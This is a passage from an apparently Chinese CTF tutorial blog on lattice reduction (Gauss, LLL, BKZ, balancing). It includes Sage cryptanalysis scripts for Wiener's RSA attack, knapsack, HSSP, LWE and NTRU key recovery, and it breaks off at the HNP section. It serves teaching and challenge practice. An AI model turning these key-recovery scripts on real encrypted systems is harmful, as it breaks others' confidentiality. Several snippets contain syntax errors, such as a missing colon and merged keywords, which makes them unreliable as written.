class="hljs-keyword">def</span> <span class="hljs-title function_">Gauss</span>(<span class="hljs-params">x,y</span>):<br>    v1,v2=x,y<br>    finished = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> finished:<br>        m=<span class="hljs-built_in">round</span>((v2.dot_product(v1)/v1.dot_product(v1)))<br>        v2 = v2 - m*v1<br>        <span class="hljs-keyword">if</span> v1.norm() &lt;= v2.norm():<br>            finished = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span><br>            v1,v2 = v2,v1<br>    <span class="hljs-keyword">return</span> v1,v2<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="LLL算法"><a href="#LLL算法" class="headerlink" title="LLL算法"></a>LLL算法</h4><ul><li><p><strong>简介：</strong> LLL算法可视为高斯算法在高维格中的推广。</p></li><li><p><strong>效果：</strong> 使施密特正交化的程度最大化，以求解最短向量问题</p></li><li><p><strong>算法步骤：</strong> </p><ul><li><p><strong>输入：</strong> $n维格的任意一组基$。</p></li><li><p><strong>输出：</strong> 以多项式时间输出一组LLL约化基。</p></li><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-built_in">max</span>(a, b):<br>    <span class="hljs-keyword">return</span> a <span class="hljs-keyword">if</span> a &gt; b <span class="hljs-keyword">else</span> b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LLL_v0</span>(<span class="hljs-params">M, delta=<span class="hljs-number">0.75</span></span>):<br>    B = deepcopy(M)<br>    Q, mu = B.gram_schmidt()<br>    n, k = B.nrows(), <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> k &lt; n:<br><br>        <span class="hljs-comment"># size reduction step</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(k)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>( mu[k][j] ) &gt; <span class="hljs-number">0.5</span>:<br>                B[k] = B[k] - <span class="hljs-built_in">round</span>( mu[k][j] ) * B[j]<br>                Q, mu = B.gram_schmidt()<br><br>        <span class="hljs-comment"># swap step </span><br>        <span class="hljs-keyword">if</span> Q[k].dot_product(Q[k]) &gt;= (delta - mu[k][k-<span class="hljs-number">1</span>]^<span class="hljs-number">2</span>) * Q[k-<span class="hljs-number">1</span>].dot_product(Q[k-<span class="hljs-number">1</span>]):<br>            k = k + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            B[k], B[k-<span class="hljs-number">1</span>] = B[k-<span class="hljs-number">1</span>], B[k]<br>            Q, mu = B.gram_schmidt()<br>            k = <span class="hljs-built_in">max</span>(k-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> B<br></code></pre></td></tr></table></figure></li><li></li></ul></li></ul><h4 id="BKZ算法"><a href="#BKZ算法" class="headerlink" title="BKZ算法"></a>BKZ算法</h4><ul><li><strong>简介：</strong> 约化能力比LLL算法更强，使用了KZ约化和深插法。</li></ul><h4 id="L-2-算法"><a href="#L-2-算法" class="headerlink" title="$L^2$ 算法"></a>$L^2$ 算法</h4><ul><li><strong>简介：</strong> 浮点型LLL算法，采用<strong>浮点数</strong>和<strong>大数运算</strong>算法优化运行时间，并使用deepinsertion提升约化能力。</li></ul><h4 id="BKZ-2-0"><a href="#BKZ-2-0" class="headerlink" title="BKZ 2.0"></a>BKZ 2.0</h4><ul><li><strong>简介：</strong> BKZ的优化版本</li></ul><h2 id="五、配平"><a href="#五、配平" class="headerlink" title="五、配平"></a>五、配平</h2><ul><li><p><strong>为什么要配平：</strong> 因为利用格基规约解决的其实是最短向量问题，而一些情况下直接构造的格不满足$|v|\le\sqrt n der(L)^{\frac1 n}$ ，也就是说想要求的向量在构造的格中不是最短向量。因此需要通过配平来使其达到最短。</p></li><li><p><strong>例子：</strong> </p><ul><li><p>已知$h&#x3D;f^{-1}g \mod p$,其中给出$(h,p)$，求$(f,g)$ ,$f$为128bits$g$为64bits,$p$为250bits。</p></li><li><p>构造格</p></li></ul></li></ul><span>$$\begin{bmatrix}f & k\end{bmatrix}\begin{bmatrix}1 & h \\0 & p\end{bmatrix}=\begin{bmatrix}f & g\end{bmatrix}$$</span><ul><li>即$vB&#x3D;w$，其中$w$就是我们想要求的向量，要保证它满足是最短向量，而实际</li></ul><span>$$ \|w\|\approx2^{128}  \\\sqrt{2p}\approx2^{125}$$</span>  <p>  而上边显然不满足，因此需要调整。令$D&#x3D;2^{10}$</p><span>$$\begin{bmatrix}f & k\end{bmatrix}\begin{bmatrix}1 & Dh \\0 & Dp\end{bmatrix}=\begin{bmatrix}f & Dg\end{bmatrix}$$</span><ul><li>此时</li></ul><span>$$\|w'\|\approx2^{128}\le\sqrt{2Dp}\approx2^{130}$$</span><ul><li>此时便能解出$w’$，求g时还需再除以D。</li></ul><h2 id="六、典型题型"><a href="#六、典型题型" class="headerlink" title="六、典型题型"></a>六、典型题型</h2><h4 id="1-Wiener攻击"><a href="#1-Wiener攻击" class="headerlink" title="1.Wiener攻击"></a>1.Wiener攻击</h4><ul><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">D = <span class="hljs-number">2</span>^(n.nbits()//<span class="hljs-number">2</span>)<br>m = matrix(ZZ, [<br>  [D, n+<span class="hljs-number">1</span>],<br>  [<span class="hljs-number">0</span>, -e]<br>])<br>L = m.LLL()<br>w = L[<span class="hljs-number">0</span>]<br>v = m.solve_left(w)<br>k = <span class="hljs-built_in">abs</span>(v[<span class="hljs-number">0</span>])<br>d = <span class="hljs-built_in">abs</span>(v[<span class="hljs-number">1</span>])<br>phi = (e*d-<span class="hljs-number">1</span>) // k<br>p_plus_q = n + <span class="hljs-number">1</span> - phi<br>p_min_q = (p_plus_q^<span class="hljs-number">2</span> - <span class="hljs-number">4</span>*n)^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>)<br>p = (p_plus_q + p_min_q) // <span class="hljs-number">2</span><br>q = n // p<br><span class="hljs-keyword">assert</span> p*q == n<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = %s&#x27;</span> % p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q = %s&#x27;</span> % q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d = %s&#x27;</span> % d)<br></code></pre></td></tr></table></figure></li><li><p>攻击条件：$d&lt;\frac13N^{\frac14}$</p></li></ul><h4 id="2-01背包密码-Knapsack"><a href="#2-01背包密码-Knapsack" class="headerlink" title="2.01背包密码(Knapsack)"></a>2.01背包密码(Knapsack)</h4><ul><li><strong>构造：</strong></li></ul><span>$$(x_0,x_1,...,x_{n-1},-1)\begin{bmatrix}2 & 0 & 0 & \cdots & 0 & M_0 \\0 & 2 & 0 & \cdots & 0 & M_1 \\0 & 0 & 2 & \cdots & 0 & M_2 \\\vdots & \vdots & \vdots & \ddots & \vdots & \vdots \\0 & 0 & 0 & \cdots & 2 & M_{n-1} \\1 & 1 & 1 & \cdots & 1 & S\end{bmatrix}\\=(2x_0-1,2x_1-1,...2x_{n-1}-1,0)$$</span><blockquote><p>PS：需要配平时在最后一列加上系数。</p></blockquote><ul><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits<br><span class="hljs-keyword">import</span> libnum<br>BITS = <span class="hljs-number">1024</span><br>fb = <span class="hljs-built_in">bin</span>(libnum.s2n(flag))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>*<span class="hljs-built_in">len</span>(flag))<br>fb = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fb]<br><br>M = [getrandbits(BITS) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fb))]<br>S = <span class="hljs-built_in">sum</span>([fb[i]*M[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fb))])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;M = %s&#x27;</span> % M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;S = %s&#x27;</span> % S)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./out&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  <span class="hljs-built_in">exec</span>(f.read())<br>n = <span class="hljs-built_in">len</span>(M)<br><br>B = zero_matrix(ZZ, n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>  B[i, i] = <span class="hljs-number">2</span><br>  B[-<span class="hljs-number">1</span>, i] = <span class="hljs-number">1</span><br>  B[i, -<span class="hljs-number">1</span>] = M[i]<br>B[-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>] = S<br>L =B.LLL()<br><span class="hljs-built_in">print</span>(L[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 理论上只含(-1, 0, 1)且只有最后一位是0，否则是没解出</span><br><br><span class="hljs-keyword">import</span> libnum<br>fb = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>((li+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>]])<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(fb, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(flag) <span class="hljs-comment"># 若解出 2 xi - 1</span><br><br>fb = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>((li+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> -L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>]])<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(fb, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(flag) <span class="hljs-comment"># 若解出 1 - 2 xi</span><br></code></pre></td></tr></table></figure></li><li><p>见另一篇文章</p></li></ul><h4 id="3-HSSP-隐子集和问题"><a href="#3-HSSP-隐子集和问题" class="headerlink" title="3.HSSP(隐子集和问题)"></a>3.HSSP(隐子集和问题)</h4><ul><li><p><strong>概述：</strong> $w&#x3D;vG,其中w,v均为GF(p)上的向量，G是01矩阵，已知w，恢复矩阵G$</p></li><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">60</span><br>m = <span class="hljs-number">330</span><br>p = ...<br>w = ...<br>MM = ...<br><br>e = <span class="hljs-number">0x10001</span><br>MM = matrix(GF(<span class="hljs-number">2</span>), MM)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allpmones</span>(<span class="hljs-params">v</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v)<br><br><span class="hljs-comment"># We generate the lattice of vectors orthogonal to b modulo x0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orthoLattice</span>(<span class="hljs-params">b, x0</span>):<br>    m = b.length()<br>    M = Matrix(ZZ, m, m)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        M[i, i] = <span class="hljs-number">1</span><br>    M[<span class="hljs-number">1</span>:m, <span class="hljs-number">0</span>] = -b[<span class="hljs-number">1</span>:m] * inverse_mod(b[<span class="hljs-number">0</span>], x0)<br>    M[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = x0<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        M[i, <span class="hljs-number">0</span>] = mod(M[i, <span class="hljs-number">0</span>], x0)<br><br>    <span class="hljs-keyword">return</span> M<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allones</span>(<span class="hljs-params">v</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v):<br>        <span class="hljs-keyword">return</span> v<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v):<br>        <span class="hljs-keyword">return</span> -v<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recoverBinary</span>(<span class="hljs-params">M5</span>):<br>    lv = [allones(vi) <span class="hljs-keyword">for</span> vi <span class="hljs-keyword">in</span> M5 <span class="hljs-keyword">if</span> allones(vi)]<br>    n = M5.nrows()<br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> lv:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            nv = allones(M5[i] - v)<br>            <span class="hljs-keyword">if</span> nv andnv <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lv:<br>                lv.append(nv)<br>            nv = allones(M5[i] + v)<br>            <span class="hljs-keyword">if</span> nv <span class="hljs-keyword">and</span> nv <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lv:<br>                lv.append(nv)<br>    <span class="hljs-keyword">return</span> Matrix(lv)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kernelLLL</span>(<span class="hljs-params">M</span>):<br>    n = M.nrows()<br>    m = M.ncols()<br>    <span class="hljs-keyword">if</span> m &lt; <span class="hljs-number">2</span> * n:<br>        <span class="hljs-keyword">return</span> M.right_kernel().matrix()<br>    K = <span class="hljs-number">2</span> ^ (m // <span class="hljs-number">2</span>) * M.height()<br><br>    MB = Matrix(ZZ, m + n, m)<br>    MB[:n] = K * M<br>    MB[n:] = identity_matrix(m)<br><br>    MB2 = MB.T.LLL().T<br><br>    <span class="hljs-keyword">assert</span> MB2[:n, : m - n] == <span class="hljs-number">0</span><br>    Ke = MB2[n:, : m - n].T<br><br>    <span class="hljs-keyword">return</span> Ke<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">m, n, p, h</span>):<br>    <span class="hljs-comment"># This is the Nguyen-Stern attack, based on BKZ in the second step</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n, <span class="hljs-string">&quot;m =&quot;</span>, m)<br><br>    iota = <span class="hljs-number">0.035</span><br>    nx0 = <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n ^ <span class="hljs-number">2</span> + n * log(n, <span class="hljs-number">2</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nx0 =&quot;</span>, nx0)<br><br>    x0 = p<br>    b = vector(h)<br><br>    <span class="hljs-comment"># only information we get</span><br>    M = orthoLattice(b, x0)<br><br>    t = cputime()<br>    M2 = M.LLL()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL step1: %.1f&quot;</span> % cputime(t))<br><br>    <span class="hljs-comment"># assert sum([vi == 0 and 1 or 0 for vi in M2 * X]) == m - n</span><br>    MOrtho = M2[: m - n]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  log(Height, 2) = &quot;</span>, <span class="hljs-built_in">int</span>(log(MOrtho.height(), <span class="hljs-number">2</span>)))<br><br>    t2 = cputime()<br>    ke = kernelLLL(MOrtho)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Kernel: %.1f&quot;</span> % cputime(t2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Total step1: %.1f&quot;</span> % cputime(t))<br><br>    <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">170</span>:<br>        <span class="hljs-keyword">return</span><br><br>    beta = <span class="hljs-number">2</span><br>    tbk = cputime()<br>    <span class="hljs-keyword">while</span> beta &lt; n:<br>        <span class="hljs-keyword">if</span> beta == <span class="hljs-number">2</span>:<br>            M5 = ke.LLL()<br>        <span class="hljs-keyword">else</span>:<br>            M5 = M5.BKZ(block_size=beta)<br><br>        <span class="hljs-comment"># we break when we only get vectors with &#123;-1,0,1&#125; components</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([<span class="hljs-literal">True</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> M5 <span class="hljs-keyword">if</span> allpmones(v)]) == n:<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> beta == <span class="hljs-number">2</span>:<br>            beta = <span class="hljs-number">10</span><br>        <span class="hljs-keyword">else</span>:<br>            beta += <span class="hljs-number">10</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BKZ beta=%d: %.1f&quot;</span> % (beta, cputime(tbk)))<br>    t2 = cputime()<br>    MB = recoverBinary(M5)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Recovery: %.1f&quot;</span> % cputime(t2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Number of recovered vector = &quot;</span>, MB.nrows())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Number of recovered vector.T = &quot;</span>, MB.ncols())<br>    <span class="hljs-keyword">return</span> MB<br><br>res = attack(m, n, p, w)<br></code></pre></td></tr></table></figure></li><li><p>详细见另一篇文章</p></li></ul><h4 id="4-LWE（容错学习问题）"><a href="#4-LWE（容错学习问题）" class="headerlink" title="4.LWE（容错学习问题）"></a>4.LWE（容错学习问题）</h4><ul><li><strong>概述：</strong> $Ax+e&#x3D;b\mod q$，已知$A,b,q$，未知$e$（很小），求$x$。</li></ul><blockquote><p>其中$A$是$m*n$矩阵，$x$是$n$维向量。</p></blockquote><ul><li><strong>分析：</strong></li></ul><span>$$Ax+e=b+kqI_m \\Ax+kqI_m=b-e \\(A|qI_m)\begin{pmatrix}x \\k\end{pmatrix}=b-e \\转置一下：(x|k)\begin{pmatrix}A^T \\qI_m\end{pmatrix} =(b-e)^T\\另一种组合：(qI_m|A)\begin{pmatrix}k \\x\end{pmatrix}=b-e \\转置一下：(k|x)\begin{pmatrix}qI_m \\A^T\end{pmatrix} =(b-e)^T\\$$</span><ul><li><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本1-小规模</span><br><span class="hljs-comment">#Sage</span><br><span class="hljs-keyword">from</span> sage.modules.free_module_integer <span class="hljs-keyword">import</span> IntegerLattice<br><br>row = <br>column = <br>prime = <br><br>ma = <br>res = <br><br>W = matrix(ZZ, ma)<br>cc = vector(ZZ, res)<br><br><span class="hljs-comment"># Babai&#x27;s Nearest Plane algorithm</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Babai_closest_vector</span>(<span class="hljs-params">M, G, target</span>):<br>    small = target<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        fori <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(M.nrows())):<br>            c = ((small * G[i]) / (G[i] * G[i])).<span class="hljs-built_in">round</span>()<br>            small -=  M[i] * c<br>    <span class="hljs-keyword">return</span> target - small<br><br>A1 = matrix.identity(column)<br>Ap = matrix.identity(row) * prime<br>B = block_matrix([[Ap], [W]])  <br>lattice = IntegerLattice(B, lll_reduce=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL done&quot;</span>)<br>gram = lattice.reduced_basis.gram_schmidt()[<span class="hljs-number">0</span>]<br>target = vector(ZZ, res)<br>re = Babai_closest_vector(lattice.reduced_basis, gram, target)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(re))<br><br>R = IntegerModRing(prime)<br>M = Matrix(R, ma)<br>M = M.transpose()<br><br>ingredients = M.solve_right(re)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ingredients))<br><br>m = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ingredients)):<br>    m += <span class="hljs-built_in">chr</span>(ingredients[i])<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure></li></ul><h4 id="5-NTRU"><a href="#5-NTRU" class="headerlink" title="5.NTRU"></a>5.NTRU</h4><ul><li><strong>概述：</strong> 公开密钥加密系统，使用基于格的加密算法来加密，包括<strong>加密算法</strong>和<strong>签名算法</strong>。</li><li><strong>密钥生成：</strong> $h\equiv f^{-1}g \mod p$，已知公钥$(h,p)$，求私钥$(f,g)$</li><li><strong>加密：</strong>$c\equiv rh + m \mod p$</li><li><strong>解密：</strong>$cf\equiv rg + mf\mod p$，满足$rg + mf&lt;p$，则有$a\equiv cf\equiv mf \mod g$，因此只要有私钥$(f,g)$和密文$c$，就能求得明文$m$</li><li><strong>构造格：</strong> $h\equiv f^{-1}g \mod p$变换得到$g&#x3D;hf+kp$</li></ul><span>$$(f,k)\begin{pmatrix}1 & h \\0 & p\end{pmatrix}=(f,g)$$</span><ul><li>脚本求解</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <br>h = <br>c = <br><br>M = Matrix(ZZ,[[<span class="hljs-number">1</span>,h],[<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>f , g = L<br>f = <span class="hljs-built_in">abs</span>(f)<br>g = <span class="hljs-built_in">abs</span>(g)<br><span class="hljs-comment">#print(f,q)</span><br>a = (c*f) %p<br>m = a*inverse(f,g)%g<br></code></pre></td></tr></table></figure><h4 id="6-Ring-LWE问题"><a href="#6-Ring-LWE问题" class="headerlink" title="6.Ring-LWE问题"></a>6.Ring-LWE问题</h4><ul><li><strong>概述：</strong> <strong>LWE</strong>在环上的版本，$A$和$x$是多项式环</li></ul><h4 id="7-HNP问题（隐藏数问题）"><a href="#7-HNP问题（隐藏数问题）" class="headerlink" 